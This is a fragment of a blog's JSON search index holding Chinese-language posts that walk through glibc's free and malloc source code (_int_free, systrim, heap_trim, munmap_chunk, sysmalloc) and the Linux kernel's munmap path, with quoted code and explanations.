123456vfprintf+11_IO_file_xsputn_IO_file_overflowfunlockfile_IO_file_writewrite","tags":[{"name":"IO_FILE","slug":"IO-FILE","permalink":"http://yoursite.com/tags/IO-FILE/"}]},{"title":"free源码分析——2","date":"2018-05-21T06:46:00.000Z","path":"2018/05/21/free源码分析——2/","text":"free源码分析—_int_free根据上一章的分析可知，如果一个chunk不是由mmap分配得到，就会调用_int_free进行释放。下面来看， 123456789101112void __libc_free(void *mem) &#123; ... p = mem2chunk(mem); if (chunk_is_mmapped(p))&#123; ... &#125; ar_ptr = arena_for_chunk(p); _int_free(ar_ptr, p, 0);&#125; _int_free第一部分首先来看_int_free第一部分，为了便于分析，这里省略了一些不关键的代码， 123456789101112131415161718192021222324252627282930313233343536373839static void _int_free(mstate av, mchunkptr p, int have_lock) &#123; INTERNAL_SIZE_T size; mfastbinptr *fb; mchunkptr nextchunk; INTERNAL_SIZE_T nextsize; int nextinuse; INTERNAL_SIZE_T prevsize; mchunkptr bck; mchunkptr fwd; const char *errstr = NULL; int locked = 0; size = chunksize(p); if (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK (size))) &#123; goto errout; &#125; check_inuse_chunk(av, p); if ((unsigned long) (size) &lt;= (unsigned long) (get_max_fast ())) &#123; free_perturb(chunk2mem(p), size - 2 * SIZE_SZ); set_fastchunks(av); unsigned int idx = fastbin_index(size); fb = &amp;fastbin(av, idx); mchunkptr old = *fb, old2; unsigned int old_idx = ~0u; do &#123; if (have_lock &amp;&amp; old != NULL) old_idx = fastbin_index(chunksize(old)); p-&gt;fd = old2 = old; &#125; while ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2); &#125; ...&#125; 第一部分首先是检查size变量的合法性，然后比较get_max_fast()判断size是否在fastbin的范围内，如果在fastbin的管理范围内，就通过set_fastchunks设置分配区的标志位表示fastbin有空闲chunk，接下来根据size获得即将添加的chunk在fastbin中的索引idx，并通过该索引获得头指针fb，最后通过CAS操作将该chunk添加到fastbin中。这里需要注意fastbin中存放的chunk是按照单向链表组织的。 _int_free第二部分继续往下看，为了使整个代码结构清晰，这里保留了上一部分的if， 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667static void _int_free(mstate av, mchunkptr p, int have_lock) &#123; ... if ((unsigned long) (size) &lt;= (unsigned long) (get_max_fast ())) &#123; ... &#125; else if (!chunk_is_mmapped(p)) &#123; nextchunk = chunk_at_offset(p, size); nextsize = chunksize(nextchunk); free_perturb(chunk2mem(p), size - 2 * SIZE_SZ); if (!prev_inuse(p)) &#123; prevsize = p-&gt;prev_size; size += prevsize; p = chunk_at_offset(p, -((long ) prevsize)); unlink(av, p, bck, fwd); &#125; if (nextchunk != av-&gt;top) &#123; nextinuse = inuse_bit_at_offset(nextchunk, nextsize); if (!nextinuse) &#123; unlink(av, nextchunk, bck, fwd); size += nextsize; &#125; else clear_inuse_bit_at_offset(nextchunk, 0); bck = unsorted_chunks(av); fwd = bck-&gt;fd; if (__glibc_unlikely(fwd-&gt;bk != bck)) &#123; errstr = &quot;free(): corrupted unsorted chunks&quot;; goto errout; &#125; p-&gt;fd = fwd; p-&gt;bk = bck; if (!in_smallbin_range(size)) &#123; p-&gt;fd_nextsize = NULL; p-&gt;bk_nextsize = NULL; &#125; bck-&gt;fd = p; fwd-&gt;bk = p; set_head(p, size | PREV_INUSE); set_foot(p, size); check_free_chunk(av, p); &#125; else &#123; size += nextsize; set_head(p, size | PREV_INUSE); av-&gt;top = p; check_chunk(av, p); &#125; ... &#125; ...&#125; 如果将要释放的chunk不属于fastbin，且不是由mmap分配的，就首先获得下一个chunk的指针nextchunk和大小nextsize，如果前一个chunk空闲，就和前一个chunk合并，并通过unlink将该chunk从空闲链表中脱离。接下来，如果刚才前面取出的下一个chunk也为空闲，并且该chunk不是top chunk，则继续合并，否则将其设为空闲。再往下，就是取出unsortedbin的头指针，将合并后的chunk插入unsortedbin链表头部，并进行相应的设置。如果下一个chunk为top chunk，就将要释放的chunk合并到top chunk中。 _int_free第三部分继续往下看， 12345678910111213141516171819202122232425262728293031323334353637static void _int_free(mstate av, mchunkptr p, int have_lock) &#123; ... if ((unsigned long) (size) &lt;= (unsigned long) (get_max_fast ())) &#123; ... &#125; else if (!chunk_is_mmapped(p)) &#123; ... if ((unsigned long) (size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123; if (have_fastchunks(av)) malloc_consolidate(av); if (av == &amp;main_arena) &#123; #ifndef MORECORE_CANNOT_TRIM if ((unsigned long) (chunksize(av-&gt;top)) &gt;= (unsigned long) (mp_.trim_threshold)) systrim(mp_.top_pad, av); #endif &#125; else &#123; heap_info *heap = heap_for_ptr(top(av)); heap_trim(heap, mp_.top_pad); &#125; &#125; if (!have_lock) &#123; assert(locked); (void) mutex_unlock(&amp;av-&gt;mutex); &#125; &#125; else &#123; munmap_chunk(p); &#125;&#125; 如果前面释放的chunk比较大，就需要做一些处理了。首先对fastbin中的chunk进行合并并添加到unsortedbin中。然后，如果是主分配区，并且主分配区的top chunk大于一定的值，就通过systrim缩小top chunk。如果是非主分配区，就获得top chunk对应的非主分配区的heap_info指针，调用heap_trim尝试缩小该heap。后面来看systrim和heap_trim这两个函数。最后，说明chunk还是通过mmap分配的，就调用munmap_chunk释放它。munmap_chunk函数已经在上一章介绍了。 systrimsystrim用于缩小主分配区的top chunk大小，下面来看， 123456789101112131415161718192021222324252627282930313233343536373839404142434445static int systrim(size_t pad, mstate av) &#123; long top_size; long extra; long released; char *current_brk; char *new_brk; size_t pagesize; long top_area; pagesize = GLRO(dl_pagesize); top_size = chunksize(av-&gt;top); top_area = top_size - MINSIZE - 1; if (top_area &lt;= pad) return 0; extra = (top_area - pad) &amp; ~(pagesize - 1); if (extra == 0) return 0; current_brk = (char *) (MORECORE(0)); if (current_brk == (char *) (av-&gt;top) + top_size) &#123; MORECORE(-extra); void (*hook)(void) = atomic_forced_read (__after_morecore_hook); if (__builtin_expect(hook != NULL, 0)) (*hook)(); new_brk = (char *) (MORECORE(0)); LIBC_PROBE (memory_sbrk_less, 2, new_brk, extra); if (new_brk != (char *) MORECORE_FAILURE) &#123; released = (long) (current_brk - new_brk); if (released != 0) &#123; av-&gt;system_mem -= released; set_head(av-&gt;top, (top_size - released) | PREV_INUSE); check_malloc_state (av); return 1; &#125; &#125; &#125; return 0;&#125; 首先，如果主分配区的top chunk本来就没什么空间，就直接返回，否则就将主分配区中可以缩小的大小保存在extra中。下面检查当前堆的brk指针是否和top chunk的结束地址相等，如果相等就可以通过MORECORE降低堆的大小，MORECORE是brk的系统调用，最后也是通过do_munmap释放虚拟内存的。__after_morecore_hook函数指针为空，不管它。再下来，获得释放后的堆指针保存在new_brk中，计算释放的虚拟内存的大小released，并将该信息更新到主分配区中，然后设置新top chunk的size。 heap_trimheap_trim用来缩小非主分配区的heap大小，下面来看， 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051static intinternal_function heap_trim(heap_info *heap, size_t pad) &#123; mstate ar_ptr = heap-&gt;ar_ptr; unsigned long pagesz = GLRO(dl_pagesize); mchunkptr top_chunk = top(ar_ptr), p, bck, fwd; heap_info *prev_heap; long new_size, top_size, top_area, extra, prev_size, misalign; while (top_chunk == chunk_at_offset(heap, sizeof(*heap))) &#123; prev_heap = heap-&gt;prev; prev_size = prev_heap-&gt;size - (MINSIZE - 2 * SIZE_SZ); p = chunk_at_offset(prev_heap, prev_size); misalign = ((long) p) &amp; MALLOC_ALIGN_MASK; p = chunk_at_offset(prev_heap, prev_size - misalign); p = prev_chunk(p); new_size = chunksize(p) + (MINSIZE - 2 * SIZE_SZ) + misalign; if (!prev_inuse(p)) new_size += p-&gt;prev_size; if (new_size + (HEAP_MAX_SIZE - prev_heap-&gt;size) &lt; pad + MINSIZE + pagesz) break; ar_ptr-&gt;system_mem -= heap-&gt;size; arena_mem -= heap-&gt;size; delete_heap(heap); heap = prev_heap; if (!prev_inuse(p))&#123; p = prev_chunk(p); unlink(ar_ptr, p, bck, fwd); &#125; top (ar_ptr) = top_chunk = p; set_head(top_chunk, new_size | PREV_INUSE); &#125; top_size = chunksize(top_chunk); top_area = top_size - MINSIZE - 1; if (top_area &lt; 0 || (size_t) top_area &lt;= pad) return 0; extra = ALIGN_DOWN(top_area - pad, pagesz); if ((unsigned long) extra &lt; mp_.trim_threshold) return 0; if (shrink_heap(heap, extra) != 0) return 0; ar_ptr-&gt;system_mem -= extra; arena_mem -= extra; set_head(top_chunk, (top_size - extra) | PREV_INUSE); return 1;&#125; 第一个while表示，如果top chunk指针正好在heap_info上，则考虑删掉整个heap。这是因为此时，该heap只有一个top chunk。再删掉该heap之前，需要检查该heap的前一个heap是否有足够的空间，否则删掉该heap后，剩余的空间太小。经过计算后，newsize保存了前一个heap高地址处的fencepost和前一个空闲chunk（如果存在）的总大小组成，如果newsize加上该heap还未使用的内存（HEAP_MAX_SIZE - prev_heap-&gt;size）太小，就break退出循环，取消对整个heap的释放。否则，在更新了相应的信息后，调用delete_heap删除整个heap，delete_heap是一个宏，定义如下 123456#define delete_heap(heap) \\ do &#123; \\ if ((char *) (heap) + HEAP_MAX_SIZE == aligned_heap_area) \\ aligned_heap_area = NULL; \\ __munmap ((char *) (heap), HEAP_MAX_SIZE); \\ &#125; while (0) delete_heap其最终通过__munmap释放整个heap，大小为HEAP_MAX_SIZE。删除掉整个heap后，如果前一个heap的fencepost的前面有一个空闲chunk，就将该空闲chunk从空闲链表中脱离，然后设置fencepost或者该空闲chunk（如果存在）的地址为新的top chunk，该top chunk的大小为前面计算的new_size。然后返回while继续检查，如果新的top chunk指针又正好在heap_info上，就表示该heap也就只有一个chunk即top chunk，就继续释放该heap。再往下，如果新的top chunk剩余空间top_area太小，就直接返回了。如果还有足够的空间，且top_area大于收缩阀值，就调用shrink_heap进一步将新的top chunk的大小减少extra。最后设置一些分配区的信息，并设置减少后的top chunk的大小为top_size - extra。 12345678910static int shrink_heap(heap_info *h, long diff) &#123; long new_size; new_size = (long) h-&gt;size - diff; if (new_size &lt; (long) sizeof(*h)) return -1; h-&gt;size = new_size; return 0;&#125; 这里其实就是减小heap_info的size变量。 总结下面对整个_int_free函数做个总结。首先检查将要释放的chunk是否属于fastbin，如果属于就将其添加到fastbin中。然后检查该chunk是否是由mmap分配的，如果不是，就根据其下一个chunk的类型添加到unsortedbin或者合并到top chunk中。接着，如果释放的chunk的大小大于一定的阀值，就需要通过systrim缩小主分配区的大小，或者通过heap_trim缩小非主分配区的大小。最后如果该chunk是由mmap的分配的，通过munmap_chunk释放。","tags":[{"name":"heap","slug":"heap","permalink":"http://yoursite.com/tags/heap/"}]},{"title":"free源码分析——1","date":"2018-05-21T06:44:59.000Z","path":"2018/05/21/free源码分析——1/","text":"free源码分析—__libc_free本章继续之前的glibc中的《malloc源码分析》系列开始分析free的源代码，malloc的源码分析可以查看博客里同类别文章下的《malloc源码分析—1》到《malloc源码分析—5》，因此free的源码中有一些结构和malloc相似的地方就不会做过多的介绍了。 首先在glibc的malloc.c中有如下定义， 1234strong_alias( __libc_free, __cfree)weak_alias( __libc_free, cfree)strong_alias( __libc_free, __free)strong_alias( __libc_free, free) 因此，free是__libc_free的别名，实际执行的是__libc_free函数，下面来看， 12345678910111213141516171819202122232425262728293031void __libc_free(void *mem) &#123; mstate ar_ptr; mchunkptr p; void (*hook)(void *, const void *) = atomic_forced_read (__free_hook); if (__builtin_expect(hook != NULL, 0)) &#123; (*hook)(mem, RETURN_ADDRESS(0)); return; &#125; if (mem == 0) return; p = mem2chunk(mem); if (chunk_is_mmapped(p))&#123; if (!mp_.no_dyn_threshold &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold&amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX) &#123; mp_.mmap_threshold = chunksize(p); mp_.trim_threshold = 2 * mp_.mmap_threshold; LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2, mp_.mmap_threshold, mp_.trim_threshold); &#125; munmap_chunk(p); return; &#125; ar_ptr = arena_for_chunk(p); _int_free(ar_ptr, p, 0);&#125; __libc_free首先查看是否有__free_hook函数，如果有就直接调用，这里假设没有默认函数可用。接下来通过mem2chunk将虚拟内存的指针mem转换为对应的chunk指针p， 1#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ)) 因为一个使用中的chunk结构体只使用其prev_size和size字段，因此这里只需要减去2*SIZE_SZ。接下来，chunk_is_mmapped用来检查size最低三位中的标志位，判断该chunk是否是由mmap分配的，如果是，就调用munmap_chunk释放该chunk并返回，在调用munmap_chunk之前，需要更新全局的mmap阀值和收缩阀值。再往下，如果该chunk不是由mmap分配的，就通过arena_for_chunk获得分配区指针ar_ptr，并调用_int_free释放内存。_int_free放在下一章分析，本章重点分析munmap_chunk函数。 munmap_chunkmunmap_chunk用来释放由mmap分配的chunk，下面来看， 1234567891011121314151617181920static void internal_function munmap_chunk(mchunkptr p) &#123; INTERNAL_SIZE_T size = chunksize(p); assert(chunk_is_mmapped (p)); uintptr_t block = (uintptr_t) p - p-&gt;prev_size; size_t total_size = p-&gt;prev_size + size; if (__builtin_expect(((block | total_size) &amp; (GLRO(dl_pagesize) - 1)) != 0, 0)) &#123; malloc_printerr(check_action, &quot;munmap_chunk(): invalid pointer&quot;, chunk2mem(p), NULL); return; &#125; atomic_decrement(&amp;mp_.n_mmaps); atomic_add(&amp;mp_.mmapped_mem, -total_size); __munmap((char *) block, total_size);&#125; 首先获得前一个chunk的指针block，计算这两个chunk的size之和至total_size，接着对全局结构mp_进行相应的设置后，就通过__munmap释放这两个chunk。根据malloc的源码可知，由mmap分配的chunk是独立的，大部分情况下，p-&gt;prev_size为0，因此这里还是释放一个chunk，特殊情况下需要释放两个chunk，特殊情况请参考_int_malloc中的代码。__munmap再往下就是系统调用了，定义在linux内核代码的mmap.c中， 12345SYSCALL_DEFINE2(munmap, unsigned long, addr, size_t, len)&#123; profile_munmap(addr); return vm_munmap(addr, len);&#125; profile_munmap为空函数，下面看vm_munmap， 12345678910int vm_munmap(unsigned long start, size_t len)&#123; int ret; struct mm_struct *mm = current-&gt;mm; down_write(&amp;mm-&gt;mmap_sem); ret = do_munmap(mm, start, len); up_write(&amp;mm-&gt;mmap_sem); return ret;&#125; 这里就是信号量的操作，最主要是执行do_munmap释放内存，为了方便分析和查看，只复制了do_munmap的关键代码， 123456789101112131415161718192021222324252627282930313233343536373839404142int do_munmap(struct mm_struct *mm, unsigned long start, size_t len)&#123; unsigned long end; struct vm_area_struct *vma, *prev, *last; if ((start &amp; ~PAGE_MASK) || start &gt; TASK_SIZE || len &gt; TASK_SIZE-start) return -EINVAL; len = PAGE_ALIGN(len); vma = find_vma(mm, start); prev = vma-&gt;vm_prev; end = start + len; if (vma-&gt;vm_start &gt;= end) return 0; if (start &gt; vma-&gt;vm_start) &#123; int error; if (end &lt; vma-&gt;vm_end &amp;&amp; mm-&gt;map_count &gt;= sysctl_max_map_count) return -ENOMEM; error = __split_vma(mm, vma, start, 0); if (error) return error; prev = vma; &#125; last = find_vma(mm, end); if (last &amp;&amp; end &gt; last-&gt;vm_start) &#123; int error = __split_vma(mm, last, end, 1); if (error) return error; &#125; vma = prev ? prev-&gt;vm_next : mm-&gt;mmap; detach_vmas_to_be_unmapped(mm, vma, prev, end); unmap_region(mm, vma, prev, start, end); arch_unmap(mm, vma, start, end); remove_vma_list(mm, vma); return 0;&#125; 首先对传入的参数进行检查，需要释放的虚拟内存的开始地址start和长度len必须按页对齐，且不能释放内核空间的内存。接着通过find_vma在进程的管理内存的AVL树上查找第一个结束地址大于start的虚拟内存vma，如果vma-&gt;vm_start &gt;= end，说明需要释放的虚拟内存本来就不存在，因此什么也不做返回；如果start &gt; vma-&gt;vm_start，则表示找到的vma包含了需要释放的内存，这时候通过__split_vma函数将该vma根据start地址划分成两块，因此需要判断虚拟内存的数量是否超过了系统的限制sysctl_max_map_count。为了方便分析，下面只给出了__split_vma的几行关键代码， 1234567891011121314151617181920212223static int __split_vma(struct mm_struct *mm, struct vm_area_struct *vma, unsigned long addr, int new_below)&#123; struct vm_area_struct *new; new = kmem_cache_alloc(vm_area_cachep, GFP_KERNEL); *new = *vma; if (new_below) new-&gt;vm_end = addr; else &#123; new-&gt;vm_start = addr; new-&gt;vm_pgoff += ((addr - vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT); &#125; if (new_below) err = vma_adjust(vma, addr, vma-&gt;vm_end, vma-&gt;vm_pgoff + ((addr - new-&gt;vm_start) &gt;&gt; PAGE_SHIFT), new); else err = vma_adjust(vma, vma-&gt;vm_start, addr, vma-&gt;vm_pgoff, new); if (!err) return 0;&#125; 首先分配一个vm_area_struct结构体new，然后将vma中的所有内容拷贝到new中，new_below决定将原vma按照addr决定的地址分割成两个后，vma中保存低地址部分还是高地址部分。do_munmap第一次进入__split_vma时new_below为0，因此返回的vma保存低地址部分。然后调用vma_adjust对低地址部分的vma进行相应的设置，主要是更改其end变量为addr，并将高地址部分插入进程内存的管理树中。 回到do_munmap中，find_vma(mm, end)获得最尾部的last，如果该last包含了需要释放的虚拟内存，就继续将其拆成两部分，这时候由于new_below为1，因此返回的last为高地址部分。返回后，vma将指向低地址部分。 结合前面的分析，在执行detach_vmas_to_be_unmapped之前，原来的vma被拆成如下所示| prev | vma | … | vma | last |mm-&gt;mmap的赋值是在vma_adjust中，其实就是拆分后低地址处那块虚拟内存。接下来detach_vmas_to_be_unmapped用于将所有和要释放的内存有交集的vma从红黑树中删除，并形成一个以vma为链表头的链表。根据刚刚vma被拆开成的结果，其实就是取数组中所有除了prev和last的元素构成一个链表。即| prev | vma | … | vma | last |经过detach_vmas_to_be_unmapped后变成，| prev| last || vma | … | vma |往下就是要释放第二部分。 123456789101112131415161718192021222324static void detach_vmas_to_be_unmapped(struct mm_struct *mm, struct vm_area_struct *vma, struct vm_area_struct *prev, unsigned long end)&#123; struct vm_area_struct **insertion_point; struct vm_area_struct *tail_vma = NULL; insertion_point = (prev ? &amp;prev-&gt;vm_next : &amp;mm-&gt;mmap); vma-&gt;vm_prev = NULL; do &#123; vma_rb_erase(vma, &amp;mm-&gt;mm_rb); mm-&gt;map_count--; tail_vma = vma; vma = vma-&gt;vm_next; &#125; while (vma &amp;&amp; vma-&gt;vm_start &lt; end); *insertion_point = vma; if (vma) &#123; vma-&gt;vm_prev = prev; vma_gap_update(vma); &#125; else mm-&gt;highest_vm_end = prev ? prev-&gt;vm_end : 0; tail_vma-&gt;vm_next = NULL; vmacache_invalidate(mm);&#125; 回到do_munmap中，unmap_region就是用于释放内存了。下面来看， 123456789101112131415static void unmap_region(struct mm_struct *mm, struct vm_area_struct *vma, struct vm_area_struct *prev, unsigned long start, unsigned long end)&#123; struct vm_area_struct *next = prev ? prev-&gt;vm_next : mm-&gt;mmap; struct mmu_gather tlb; lru_add_drain(); tlb_gather_mmu(&amp;tlb, mm, start, end); update_hiwater_rss(mm); unmap_vmas(&amp;tlb, vma, start, end); free_pgtables(&amp;tlb, vma, prev ? prev-&gt;vm_end : FIRST_USER_ADDRESS, next ? next-&gt;vm_start : USER_PGTABLES_CEILING); tlb_finish_mmu(&amp;tlb, start, end);&#125; lru_add_drain用于将percpu变量pagevec对应的每个page放回其对应的zone的lru链表中，因为马上要解映射了，这些缓存的page变量由可能被改变。tlb_gather_mmu构造了一个mmu_gather变量并初始化。接下来的unmap_vmas用于解映射，即释放存在物理页面映射的虚拟内存， 123456789void unmap_vmas(struct mmu_gather *tlb, struct vm_area_struct *vma, unsigned long start_addr, unsigned long end_addr)&#123; struct mm_struct *mm = vma-&gt;vm_mm; mmu_notifier_invalidate_range_start(mm, start_addr, end_addr); for ( ; vma &amp;&amp; vma-&gt;vm_start &lt; end_addr; vma = vma-&gt;vm_next) unmap_single_vma(tlb, vma, start_addr, end_addr, NULL); mmu_notifier_invalidate_range_end(mm, start_addr, end_addr);&#125; 这里开始遍历vma链表，对每个vma调用unmap_single_vma进行释放， 123456789101112131415161718192021222324252627static void unmap_single_vma(struct mmu_gather *tlb, struct vm_area_struct *vma, unsigned long start_addr, unsigned long end_addr, struct zap_details *details)&#123; unsigned long start = max(vma-&gt;vm_start, start_addr); unsigned long end; if (start &gt;= vma-&gt;vm_end) return; end = min(vma-&gt;vm_end, end_addr); if (end &lt;= vma-&gt;vm_start) return; if (vma-&gt;vm_file) uprobe_munmap(vma, start, end); if (unlikely(vma-&gt;vm_flags &amp; VM_PFNMAP)) untrack_pfn(vma, 0, 0); if (start != end) &#123; if (unlikely(is_vm_hugetlb_page(vma))) &#123; if (vma-&gt;vm_file) &#123; i_mmap_lock_write(vma-&gt;vm_file-&gt;f_mapping); __unmap_hugepage_range_final(tlb, vma, start, end, NULL); i_mmap_unlock_write(vma-&gt;vm_file-&gt;f_mapping); &#125; &#125; else unmap_page_range(tlb, vma, start, end, details); &#125;&#125; 这里主要就是通过unmap_page_range进行释放。再往下因为涉及太多linux内核内存管理的知识，这里就不深入分析了，最后就是通过虚拟地址找到页表pte，解开和物理页面之间的映射，并设置一些page结构。由于unmap_vmas后，一些页表里没有了相对应的物理页面，free_pgtables将这些页表释放。 12345678910111213141516171819202122232425262728void free_pgtables(struct mmu_gather *tlb, struct vm_area_struct *vma, unsigned long floor, unsigned long ceiling)&#123; while (vma) &#123; struct vm_area_struct *next = vma-&gt;vm_next; unsigned long addr = vma-&gt;vm_start; unlink_anon_vmas(vma); unlink_file_vma(vma); if (is_vm_hugetlb_page(vma)) &#123; hugetlb_free_pgd_range(tlb, addr, vma-&gt;vm_end, floor, next? next-&gt;vm_start: ceiling); &#125; else &#123; while (next &amp;&amp; next-&gt;vm_start &lt;= vma-&gt;vm_end + PMD_SIZE &amp;&amp; !is_vm_hugetlb_page(next)) &#123; vma = next; next = vma-&gt;vm_next; unlink_anon_vmas(vma); unlink_file_vma(vma); &#125; free_pgd_range(tlb, addr, vma-&gt;vm_end, floor, next? next-&gt;vm_start: ceiling); &#125; vma = next; &#125;&#125; 这里主要是调用free_pgd_range。该函数中，假设要释放的虚拟内存为vma，其前一个vma为prev，后一个为last，如果释放完vma后，prev-&gt;vm_end到last-&gt;vm_start大于一个pgd管理的内存大小（32位系统下为4MB），就释放pgd里的所有页表，如果小于4MB，就什么也不做返回。 再回到do_munmap中，arch_unmap是一些体系结构相关的操作，不管它。remove_vma_list释放每个vma对应的vm_area_struct结构至slab分配器中。 123456789101112131415static void remove_vma_list(struct mm_struct *mm, struct vm_area_struct *vma)&#123; unsigned long nr_accounted = 0; update_hiwater_vm(mm); do &#123; long nrpages = vma_pages(vma); if (vma-&gt;vm_flags &amp; VM_ACCOUNT) nr_accounted += nrpages; vm_stat_account(mm, vma-&gt;vm_flags, vma-&gt;vm_file, -nrpages); vma = remove_vma(vma); &#125; while (vma); vm_unacct_memory(nr_accounted); validate_mm(mm);&#125; 主要的函数是remove_vma，该函数通过kmem_cache_free释放对应的vma，并返回链表上的下一个vma。 12345678910111213static struct vm_area_struct *remove_vma(struct vm_area_struct *vma)&#123; struct vm_area_struct *next = vma-&gt;vm_next; might_sleep(); if (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;close) vma-&gt;vm_ops-&gt;close(vma); if (vma-&gt;vm_file) fput(vma-&gt;vm_file); mpol_put(vma_policy(vma)); kmem_cache_free(vm_area_cachep, vma); return next;&#125;","tags":[{"name":"heap","slug":"heap","permalink":"http://yoursite.com/tags/heap/"}]},{"title":"malloc源码分析——5","date":"2018-05-21T06:42:38.000Z","path":"2018/05/21/malloc源码分析——5/","text":"malloc源码分析—sysmalloc本章主要分析sysmalloc的代码，在《malloc源码分析—2》中已经分析了部分sysmalloc的代码，主要用于对分配区进行初始化。本章查看余下的代码， 第一部分1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374static void * sysmalloc(INTERNAL_SIZE_T nb, mstate av) &#123; mchunkptr old_top; INTERNAL_SIZE_T old_size; char *old_end; long size; char *brk; long correction; char *snd_brk; INTERNAL_SIZE_T front_misalign; INTERNAL_SIZE_T end_misalign; char *aligned_brk; mchunkptr p; mchunkptr remainder; unsigned long remainder_size; size_t pagesize = GLRO(dl_pagesize); bool tried_mmap = false; ... old_top = av-&gt;top; old_size = chunksize(old_top); old_end = (char *) (chunk_at_offset(old_top, old_size)); brk = snd_brk = (char *) (MORECORE_FAILURE); if (av != &amp;main_arena) &#123; heap_info *old_heap, *heap; size_t old_heap_size; old_heap = heap_for_ptr(old_top); old_heap_size = old_heap-&gt;size; if ((long) (MINSIZE + nb - old_size) &gt; 0 &amp;&amp; grow_heap(old_heap, MINSIZE + nb - old_size) == 0) &#123; av-&gt;system_mem += old_heap-&gt;size - old_heap_size; arena_mem += old_heap-&gt;size - old_heap_size; set_head(old_top, (((char *) old_heap + old_heap-&gt;size) - (char *) old_top) | PREV_INUSE); &#125; else if ((heap = new_heap(nb + (MINSIZE + sizeof(*heap)), mp_.top_pad))) &#123; heap-&gt;ar_ptr = av; heap-&gt;prev = old_heap; av-&gt;system_mem += heap-&gt;size; arena_mem += heap-&gt;size; top (av) = chunk_at_offset(heap, sizeof(*heap)); set_head(top (av), (heap-&gt;size - sizeof (*heap)) | PREV_INUSE); old_size = (old_size - MINSIZE ) &amp; ~MALLOC_ALIGN_MASK; set_head(chunk_at_offset (old_top, old_size + 2 * SIZE_SZ), 0 | PREV_INUSE); if (old_size &gt;= MINSIZE) &#123; set_head(chunk_at_offset (old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE); set_foot(chunk_at_offset (old_top, old_size), (2 * SIZE_SZ)); set_head(old_top, old_size | PREV_INUSE | NON_MAIN_ARENA); _int_free(av, old_top, 1); &#125; else &#123; set_head(old_top, (old_size + 2 * SIZE_SZ) | PREV_INUSE); set_foot(old_top, (old_size + 2 * SIZE_SZ)); &#125; &#125; else if (!tried_mmap) goto try_mmap; &#125; else&#123; ... &#125; ...&#125; 首先，old_top、old_size和old_end分别保存了top chunk的指针，大小以及尾部的地址。如果是非主分配区，首先通过heap_for_ptr获得原top chunk对应的heap_info指针， 12#define heap_for_ptr(ptr) \\ ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1))) 对于非主分配区，因为每个heap是按照HEAP_MAX_SIZE的大小分配且对齐的，而每个topchunk存在于每个heap的剩余空间（高地址处），因此通过heap_for_ptr就能取出heap_info指针，heap_info保存了每个heap的相关信息。获得heap_info指针后，就能获得该heap当前被使用的大小并将其保存在old_heap_size中。根据《malloc源码分析—4》，进入到sysmalloc前会尝试在top chunk分配内存，因此代码执行到这里肯定失败了。所以这里只有MINSIZE + nb - old_size&gt;0这一种情况，即这时的top chunk空间不足了，因此首先通过grow_heap尝试向heap的高地址处增加heap当前使用的大小，即top chunk的大小， 12345678910111213141516171819202122static int grow_heap(heap_info *h, long diff) &#123; size_t pagesize = GLRO(dl_pagesize); long new_size; diff = ALIGN_UP(diff, pagesize); new_size = (long) h-&gt;size + diff; if ((unsigned long) new_size &gt; (unsigned long) HEAP_MAX_SIZE) return -1; if ((unsigned long) new_size &gt; h-&gt;mprotect_size) &#123; if (__mprotect((char *) h + h-&gt;mprotect_size, (unsigned long) new_size - h-&gt;mprotect_size, PROT_READ | PROT_WRITE) != 0) return -2; h-&gt;mprotect_size = new_size; &#125; h-&gt;size = new_size; LIBC_PROBE(memory_heap_more, 2, h, h-&gt;size); return 0;&#125; 这段代码其实最关键的是h-&gt;size = new_size这一样，表示重新设置heap的大小至new_size。回到sysmalloc中，假设grow_heap成功，即将top chunk的大小设置为MINSIZE + nb，则重新设置分配区使用的内存大小，并且设置top chunk的size至新值（注意这里的size不能直接设置为MINSIZE + nb是因为在grow_heap中有对齐操作）。 假设grow_heap失败，大部分情况下说明heap的使用大小已经接近其最大值HEAP_MAX_SIZE了，此时只能通过new_heap重新分配一个heap，注意传入的参数mp_.top_pad表示在分配内存时，额外多分配的内存。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758static heap_info * internal_function new_heap(size_t size, size_t top_pad) &#123; size_t pagesize = GLRO(dl_pagesize); char *p1, *p2; unsigned long ul; heap_info *h; if (size + top_pad &lt; HEAP_MIN_SIZE) size = HEAP_MIN_SIZE; else if (size + top_pad &lt;= HEAP_MAX_SIZE) size += top_pad; else if (size &gt; HEAP_MAX_SIZE) return 0; else size = HEAP_MAX_SIZE; size = ALIGN_UP(size, pagesize); p2 = MAP_FAILED; if (aligned_heap_area) &#123; p2 = (char *) MMAP(aligned_heap_area, HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE); aligned_heap_area = NULL; if (p2 != MAP_FAILED &amp;&amp; ((unsigned long) p2 &amp; (HEAP_MAX_SIZE - 1))) &#123; __munmap(p2, HEAP_MAX_SIZE); p2 = MAP_FAILED; &#125; &#125; if (p2 == MAP_FAILED) &#123; p1 = (char *) MMAP(0, HEAP_MAX_SIZE &lt;&lt; 1, PROT_NONE, MAP_NORESERVE); if (p1 != MAP_FAILED) &#123; p2 = (char *) (((unsigned long) p1 + (HEAP_MAX_SIZE - 1)) &amp; ~(HEAP_MAX_SIZE - 1)); ul = p2 - p1; if (ul) __munmap(p1, ul); else aligned_heap_area = p2 + HEAP_MAX_SIZE; __munmap(p2 + HEAP_MAX_SIZE, HEAP_MAX_SIZE - ul); &#125; else &#123; p2 = (char *) MMAP(0, HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE); if (p2 == MAP_FAILED) return 0; if ((unsigned long) p2 &amp; (HEAP_MAX_SIZE - 1)) &#123; __munmap(p2, HEAP_MAX_SIZE); return 0; &#125; &#125; &#125; if (__mprotect(p2, size, PROT_READ | PROT_WRITE) != 0) &#123; __munmap(p2, 